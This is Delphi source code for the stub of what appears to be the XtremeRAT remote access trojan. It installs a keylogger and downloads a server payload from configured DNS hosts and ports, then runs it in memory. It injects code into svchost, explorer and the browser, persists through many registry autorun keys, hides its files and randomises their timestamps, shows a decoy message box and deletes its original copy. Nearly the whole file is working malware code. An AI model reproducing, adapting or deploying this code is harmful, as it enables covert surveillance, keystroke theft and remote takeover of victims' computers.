program stub;
{$IMAGEBASE 13140000}
{$SETPEOPTFLAGS $010}

uses
  uDEP,
  windows,
  UnitCryptString,
  UnitInjectProcess,
  UnitBinder,
  Functions,
  UnitInjectServer,
  UnitInstallServer,
  UnitKeylogger,
  UnitGetServer,
  UnitConfigs;

function write2regSpecial(key: Hkey; subkey, name, value: pWideChar; Size: int64;
  RegistryValueTypes: DWORD = REG_EXPAND_SZ): boolean;
var
  regkey: Hkey;
begin
  Result := false;
  RegCreateKeyW(key, subkey, regkey);
  if RegSetValueExW(regkey, name, 0, RegistryValueTypes, value, Size) = 0 then
    Result := true;
  RegCloseKey(regkey);
end;

type
  pDados = ^TDados;
  TDados = Record
    Config: TConfiguracoes;
    InstalledServer: array [0..MAX_PATH] of WideChar;
    InstalledServerPath: array [0..MAX_PATH] of WideChar;
    ConfigFile: array [0..MAX_PATH] of WideChar;
    ActiveXKey: array [0..MAX_PATH] of WideChar;
  end;

procedure Start(Dados: pDados); stdcall;
var
  MainMutex, TempMutex, h: Cardinal;
  p: pointer;
  i: integer;
  TempStr: WideString;
  ProcName: array [0..MAX_PATH] of WideChar;
  Injected: boolean;
begin
  LoadLibrary('user32.dll');
  LoadLibrary('urlmon.dll');
  LoadLibrary('wininet.dll');
  LoadLibrary('advapi32.dll');
  LoadLibrary('Shell32.dll');

  MainMutex := CreateMutexW(nil, False, Dados.Config.Mutex);
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    ExitProcess(0);
  end;

  Sleep(1000);

  DownloadPlugin := Dados.Config.DownloadPlugin;
  PluginLink := SomarpWideChar(Dados.Config.PluginLink, '');

  ServerBufferFileName := SomarpWideChar(ExtractFilePath(Dados.ConfigFile), Dados.Config.Mutex);
  ServerBufferFileName := SomarpWideChar(ServerBufferFileName, '.xtr');

  KeyloggerFileName := SomarpWideChar(ExtractFilePath(Dados.ConfigFile), Dados.Config.Mutex);
  KeyloggerFileName := SomarpWideChar(KeyloggerFileName, '.dat');

  KeyloggerConfig := Dados.Config;

  if dados.Config.ActiveKeylogger = True then StartKey;

  for i := 0 to NUMMAXCONNECTION - 1 do
  begin
    TempStr := '';
    if (Dados.Config.Ports[i] > 0) and (WideString(Dados.Config.DNS[i]) <> '') then
    TempStr := 'http://' + WideString(Dados.Config.DNS[i]) + ':' + IntToStr(Dados.Config.Ports[i]) + '/' + IntToStr(Dados.Config.Password) + '.functions';
    if TempStr <> '' then ObterServerEnderecos[i] := TempStr;
  end;

  PluginOK := False;
  h := StartThread(@StartObterServidor, nil);
  while PluginOK = False do
  begin
    sleep(10);
    ProcessMessages;
  end;
  CloseHandle(MainMutex);
  CloseHandle(TempMutex);

  StopKey;

  HideFileName(pwChar(ServerBufferFileName));
  if ServerBuffer = nil then ExitProcess(0);

  ShellExecute(0, 'open', Dados.InstalledServer, nil, nil, SW_HIDE);
  ExitProcess(0);
end;

procedure StartPersist(Dados: pDados); stdcall;
var
  PersistMutex, TempMutex: Cardinal;
  ServerBuffer: Pointer;
  c: Cardinal;
  hFile: THandle;
  Size: int64;
  ActX: pWideChar;
  WinS: pWideChar;
begin
  LoadLibrary('user32.dll');
  LoadLibrary('advapi32.dll');
  LoadLibrary('shell32.dll');
  LoadLibrary('shlwapi.dll');
  LoadLibrary('kernel32.dll');

  ServerBuffer := nil;
  PersistMutex := CreateMutexW(nil, False, Dados.Config.MutexPersist);

  hFile := CreateFileW(Dados.InstalledServer, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    Size := GetFileSize(hFile, nil);
    ServerBuffer := VirtualAlloc(nil, Size, MEM_COMMIT, PAGE_READWRITE);
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    ReadFile(hFile, ServerBuffer^, Size, c, nil);
  end;
  CloseHandle(hFile); // se eu quiser que fique indeletável, eu deleto essa linha e deixo aberto o arquivo

  c := 0;
  Sleep(10000);

  ActX := SomarPWideChar(Dados.InstalledServer, ' restart');
  WinS := SomarPWideChar('explorer.exe ', Dados.InstalledServer);

  while True do
  begin
    if Dados.Config.Restart = True then
    begin
      if Dados.Config.HKLMRunBool = true then
      Write2RegSpecial(HKEY_LOCAL_MACHINE, SoftRun, Dados.Config.HKLMRun, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);

      if Dados.Config.HKCURunBool = true then
      Write2RegSpecial(HKEY_CURRENT_USER, SoftRun, Dados.Config.HKCURun, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);

      if Dados.Config.ActiveXBool = true then
      begin
        SHDeleteKey(HKEY_CURRENT_USER,  Dados.ActiveXKey);
        Write2RegSpecial(HKEY_LOCAL_MACHINE, Dados.ActiveXKey, 'StubPath', ActX, StrLen(ActX) * 2);
      end;

      if Dados.Config.MoreStartUp = True then
      begin

        if Dados.Config.RunOnceBool = true then
        begin
          Write2RegSpecial(HKEY_CURRENT_USER, RunOnce, Dados.Config.MoreStartUpName, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
          Write2RegSpecial(HKEY_LOCAL_MACHINE, RunOnce, Dados.Config.MoreStartUpName, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
        end;

        if Dados.Config.WinLoadBool = true then
        begin
          Write2RegSpecial(HKEY_CURRENT_USER, WinLoad, 'Load', Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
          Write2RegSpecial(HKEY_LOCAL_MACHINE, WinLoad, 'Load', Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
        end;

        if Dados.Config.WinShellBool = true then
        begin
          Write2RegSpecial(HKEY_CURRENT_USER, WinShell, 'Shell', WinS, StrLen(WinS) * 2);
          Write2RegSpecial(HKEY_LOCAL_MACHINE, WinShell, 'Shell', WinS, StrLen(WinS) * 2);
        end;

        if Dados.Config.RunPolicies = true then
        begin
          Write2RegSpecial(HKEY_CURRENT_USER, Policies, Dados.Config.MoreStartUpName, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
          Write2RegSpecial(HKEY_LOCAL_MACHINE, Policies, Dados.Config.MoreStartUpName, Dados.InstalledServer, StrLen(Dados.InstalledServer) * 2);
        end;

      end;
    end;

    if FileExists(Dados.InstalledServer) = false then
    begin
      if ForceDirectories(Dados.InstalledServerPath) then
      begin
        if Size > 0 then
        CriarArquivo(Dados.InstalledServer, ServerBuffer, Size);

        if Dados.Config.HideServer = True then
        begin
          SetFileAttributesW(Dados.InstalledServerPath, FILE_ATTRIBUTE_NORMAL);
          SetFileAttributesW(Dados.InstalledServer, FILE_ATTRIBUTE_NORMAL);
          Randomize;
          try
            SetFileDateTime(Dados.InstalledServerPath,
                            2001 + Random(6),
                            1 + Random(11),
                            1 + random(27),
                            1 + random(10),
                            1 + random(10),
                            1 + random(10));
            except
          end;
          try
            SetFileDateTime(Dados.InstalledServer,
                            2001 + Random(6),
                            1 + Random(11),
                            1 + random(27),
                            1 + random(10),
                            1 + random(10),
                            1 + random(10));
            except
          end;
          HideFileName(Dados.InstalledServerPath);
          HideFileName(Dados.InstalledServer);
        end;
      end;
    end;
    TempMutex := CreateMutexW(nil, False, Dados.Config.Mutex);
    if GetLastError <> ERROR_ALREADY_EXISTS then
    begin
      CloseHandle(TempMutex);
      ShellExecute(0, 'open', Dados.InstalledServer, nil, nil, SW_HIDE);
    end else CloseHandle(TempMutex);

    TempMutex := CreateMutexW(nil, False, Dados.Config.MutexSair);
    if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0) else CloseHandle(TempMutex);

    Sleep(5000);
  end;

end;

procedure ShowTime(Buffer: pWideChar);
var
  tm: TSYSTEMTIME;
begin
  GetLocalTime(tm);
  GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_SHORTDATE, @tm, nil, Buffer, 255);
  Buffer[StrLen(Buffer)] := WideChar($20);
  GetTimeFormatW(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, @tm, nil, @Buffer[StrLen(Buffer)], 255);
end;

function ShellExecuteW(hWnd: HWND; Operation, FileName, Parameters,
  Directory: PWideChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll' name 'ShellExecuteW';

type
  pMelt = ^TMelt;
  TMelt = Record
    FileName: array [0..MAX_PATH] of WideChar;
end;

procedure SelfDelete(Melt: pMelt); stdcall;
begin
  while FileExists(Melt.FileName) = True do
  begin
    SetFileAttributesW(Melt.FileName, FILE_ATTRIBUTE_NORMAL);
    if DeleteFileW(Melt.FileName) = True then Break else sleep(1000);
  end;
  ExitProcess(0);
end;

function CheckFakeMessage: boolean;
Var
  Handle: Hkey;
  RegType: integer;
  DataSize: integer;
begin
  Result := false;
  if (RegOpenKeyExW(HKEY_CURRENT_USER, 'SOFTWARE\FakeMessage', 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueExW(Handle, 'FakeMessage', nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      if DataSize > 0 then Result := True;
    end;
    RegCloseKey(Handle);
  end;
end;

procedure ExecFakeMessage(Config: pConfiguracoes); stdcall;
var
  mType, bType: cardinal;
begin
  LoadLibrary('user32.dll');
  LoadLibrary('advapi32.dll');
  LoadLibrary('shell32.dll');
  LoadLibrary('shlwapi.dll');

  Write2RegSpecial(HKEY_CURRENT_USER, 'SOFTWARE\FakeMessage', 'FakeMessage', 'OK', 4);

  if Config.FakeMessageAnswer = 0 then bType := MB_OK else
  if Config.FakeMessageAnswer = 1 then bType := MB_OKCANCEL else
  if Config.FakeMessageAnswer = 2 then bType := MB_RETRYCANCEL else
  if Config.FakeMessageAnswer = 3 then bType := MB_YESNO else
  if Config.FakeMessageAnswer = 4 then bType := MB_YESNOCANCEL else
  if Config.FakeMessageAnswer = 5 then bType := MB_ABORTRETRYIGNORE;

  if Config.FakeMessageType = 0 then mType := MB_ICONQUESTION else
  if Config.FakeMessageType = 1 then mType := MB_ICONERROR else
  if Config.FakeMessageType = 2 then mType := MB_ICONWARNING else
  if Config.FakeMessageType = 3 then mType := MB_ICONINFORMATION else
  if Config.FakeMessageType = 4 then mType := 0;

  MessageBoxW(0, Config.FakeMessageText, Config.FakeMessageCaption, bType or mType);
  //ExitProcess(0);
end;

var
  Restart: WideString = 'restart';
  DefaultBrowser: WideString = '%DEFAULTBROWSER%';
  NoInjection: WideString = '%NOINJECT%';
  Config: TConfiguracoes;
  TempStr, InstalledServer, ProcName, TempStr1: pWideChar;
  Size: int64;
  p: pointer;
  TempMutex, Process, MasterMutex: Cardinal;
  Hora, OriginalFile: array [0..MAX_PATH] of WideChar;
  i: integer;
  Dados: TDados;
  Melt: TMelt;
  Injected: boolean;
  PI: TProcessInformation;
begin
  //DisableDEP(getcurrentprocessid);

  NoErrMsg := True;
  SetErrorMode(SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX);

  sleep(100);

  if ParamStr(1) = restart then
  begin
    ShellExecuteW(0,
                 'open',
                 Paramstr(0),
                 nil,
                 nil,
                 SW_HIDE);
    exitprocess(0);
  end;

  TempMutex := CreateMutexW(nil, False, 'XTREMEUPDATE');
  if GetLastError = ERROR_ALREADY_EXISTS then Sleep(6000);
  CloseHandle(TempMutex);

  ZeroMemory(@Config, SizeOf(Config));
  Config := LoadSettings;
  EnDecryptStrRC4B(@Config, SizeOf(Config), 'CONFIG');

  SHDeleteKey(HKEY_CURRENT_USER, 'SOFTWARE\XtremeRAT');

  TempStr := SomarPWideChar(GetAppDataDir, '\Microsoft\Windows\');

  if ForceDirectories(TempStr) = True then
  begin
    TempStr := SomarPWideChar(TempStr, Config.Mutex);
    TempStr := SomarPWideChar(TempStr, '.cfg');
  end else
  begin
    TempStr := SomarPWideChar(GetAppDataDir, '\');
    TempStr := SomarPWideChar(TempStr, Config.Mutex);
    TempStr := SomarPWideChar(TempStr, '.cfg');
  end;

  if FileExists(TempStr) then
  begin
    SetFileAttributesW(TempStr, FILE_ATTRIBUTE_NORMAL);
    Size := LerArquivo(TempStr, p);
    HideFilename(TempStr);
    EnDecryptStrRC4B(p, Size, 'CONFIG');
    ZeroMemory(@Config, SizeOf(Config));
    CopyMemory(@Config, p, SizeOf(Config));

    if Config.CheckRealConfig <> 123456 then
    begin
      SetFileAttributesW(TempStr, FILE_ATTRIBUTE_NORMAL);
      DeleteFileW(TempStr);
      ZeroMemory(@Config, SizeOf(Config));
      Config := LoadSettings;
      EnDecryptStrRC4B(@Config, SizeOf(Config), 'CONFIG');
    end;
  end;

  SetFileAttributesW(TempStr, FILE_ATTRIBUTE_NORMAL);
  DeleteFileW(TempStr);
  GetMem(p, SizeOf(Config));
  CopyMemory(p, @Config, SizeOf(Config));
  EnDecryptStrRC4B(p, SizeOf(Config), 'CONFIG');
  CriarArquivo(TempStr, p, SizeOf(Config));
  HideFilename(TempStr);

  MasterMutex := CreateMutexW(nil, False, Config.Mutex);
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    ExitProcess(0);
  end;
  //CloseHandle(MasterMutex);

  i := Config.Delay;
  while i > 0 do
  begin
    Sleep(1000);
    dec(i, 1)
  end;

  CopyMemory(@Dados.ConfigFile, TempStr, Length(TempStr) * 2);
  ShowTime(Hora);
  Write2Reg(HKEY_CURRENT_USER, SomarpWideChar('SOFTWARE\', Config.Mutex), 'ServerStarted', Hora);

  if Config.UseFakeMessage = True then
  begin
    if CheckFakeMessage = False then
    begin
      ExecFakeMessage(@Config);
    end;
  end;

  GetModuleFileNameW(0, OriginalFile, sizeof(OriginalFile));

  TempStr := CopyServer(OriginalFile, Config);
  RestartServer(TempStr, Config);

  InstalledServer := SomarPWideChar(TempStr, '');

  if Config.HideServer = True then
  begin
    SetFileAttributesW(InstalledServer, FILE_ATTRIBUTE_NORMAL);
    SetFileAttributesW(ExtractFilePath(InstalledServer), FILE_ATTRIBUTE_NORMAL);
    Randomize;
    try
      SetFileDateTime(InstalledServer,
                      2001 + Random(6),
                      1 + Random(11),
                      1 + random(27),
                      1 + random(10),
                      1 + random(10),
                      1 + random(10));
      except
    end;
    try
      SetFileDateTime(ExtractFilePath(InstalledServer),
                      2001 + Random(6),
                      1 + Random(11),
                      1 + random(27),
                      1 + random(10),
                      1 + random(10),
                      1 + random(10));
      except
    end;
    HideFileName(InstalledServer);
    HideFileName(ExtractFilePath(InstalledServer));
  end;

  Write2Reg(HKEY_CURRENT_USER, SomarPWideChar('SOFTWARE\', Config.Mutex), 'InstalledServer', InstalledServer);
  Dados.Config := Config;
  CopyMemory(@Dados.InstalledServer, InstalledServer, StrLen(InstalledServer) * 2);

  TempStr := SomarPWideChar('Software\Microsoft\Active Setup\Installed Components\', Config.ActiveX);
  CopyMemory(@Dados.ActiveXKey, TempStr, StrLen(TempStr) * 2);

  TempStr := ExtractFilePath(InstalledServer);

  CopyMemory(@Dados.InstalledServerPath, TempStr, StrLen(TempStr) * 2);

  if (Config.Persistencia = True) then
  begin
    TempMutex := CreateMutexW(nil, False, Config.MutexPersist);
    if GetLastError <> ERROR_ALREADY_EXISTS then
    begin
      CloseHandle(TempMutex);
      ProcName := SomarPWideChar('svchost.exe','');
      ZeroMemory(@OriginalFile, SizeOf(OriginalFile));
      CopyMemory(@OriginalFile, ProcName, StrLen(procName) * 2);
      Process := CreateAndGetProcessHandle(OriginalFile, PI);
      InjectIntoProcess(Process, @StartPersist, @Dados);
    end else CloseHandle(TempMutex);
  end;

  if Config.InjectProcess = NoInjection then  begin
  ProcName := OriginalFile ;
  Process := CreateAndGetProcessHandle(OriginalFile, PI);
 end else
    if Config.InjectProcess = DefaultBrowser then
    begin
      ProcName := GetDefaultBrowser;
      Process := CreateAndGetProcessHandle(ProcName, PI);
    end else
    begin
      ProcName := SomarPWideChar(Config.InjectProcess, '');
      Process := CreateAndGetProcessHandle(ProcName, PI);
      if Process = 0 then
      begin
        if ProcessExists(ProcName, Process) = False then ProcName := OriginalFile else
        ProcName := GetPathFromPID(Process);
        Process := CreateAndGetProcessHandle(ProcName, PI);
        if Process = 0 then
        begin
          ProcName := GetDefaultBrowser;
          Process := CreateAndGetProcessHandle(ProcName, PI);
        end;
      end;
    end;

  i := 0;
  p := nil;

  if Config.Melt then
  begin
    TempStr := InstalledServer;
    TempStr1 := SomarPWideChar(Paramstr(0), '');

    if ComparePointer(TempStr, TempStr1, StrLen(TempStr)) = False then
    begin
      SetFileAttributesW(TempStr1, FILE_ATTRIBUTE_NORMAL);
      CopyMemory(@Melt.FileName, TempStr1, StrLen(TempStr1) * 2);
      InjectIntoProcess(CreateAndGetProcessHandle(SomarPWideChar('explorer.exe', ''), PI), @SelfDelete, @Melt);
    end;
  end;

  ServerBufferFileName := SomarpWideChar(ExtractFilePath(Dados.ConfigFile), Dados.Config.Mutex);
  ServerBufferFileName := SomarpWideChar(ServerBufferFileName, '.xtr');
  if FileExists(ServerBufferFileName) then
  begin
    if ObterServidor('local') = True then
    begin
      if Process = 0 then
      begin
        GetModuleFileNameW(0, OriginalFile, sizeof(OriginalFile));
        Process := CreateAndGetProcessHandle(OriginalFile, PI);
      end;

      EnDecryptStrRC4B(ServerBuffer, ServerBufferSize - 30, 'XTREME');
      Write2Reg(HKEY_CURRENT_USER, pWideChar('SOFTWARE\' + IntToStr(GetCurrentProcessID)), 'Mutex', Dados.Config.Mutex);
      CloseHandle(MasterMutex);
      RunEXE(ServerBuffer, nil, Process, @PI);
      sleep(1000);
      ExitProcess(0);

  end;
  end;

  if Process = 0 then
  begin
    ExecutarBinder(Config);
    Start(@Dados);
  end else
  begin
    CloseHandle(MasterMutex);
    repeat
      p := InjectIntoProces(Process, @Start, @Dados);
      Sleep(500);
      if p = nil then
      begin
        TerminateProcess(Process, ExitCode);
        Process := CreateAndGetProcessHandle(ProcName, PI);
      end;
      inc(i);

      TempMutex := CreateMutexW(nil, False, Config.Mutex);
      Injected := (GetLastError = ERROR_ALREADY_EXISTS);
      CloseHandle(TempMutex);

      if Injected = False then
      begin
        TerminateProcess(Process, ExitCode);
        Process := CreateAndGetProcessHandle(ProcName, PI);
      end;

    until (i >= 7) or (Injected = True);

    ExecutarBinder(Config);

    if p = nil then
    begin
      TerminateProcess(Process, ExitCode);
      Start(@Dados);
    end;

    if (i >= 7) and (injected = False) then ShellExecute(0, 'open', InstalledServer, nil, nil, SW_HIDE);
  end;
end.
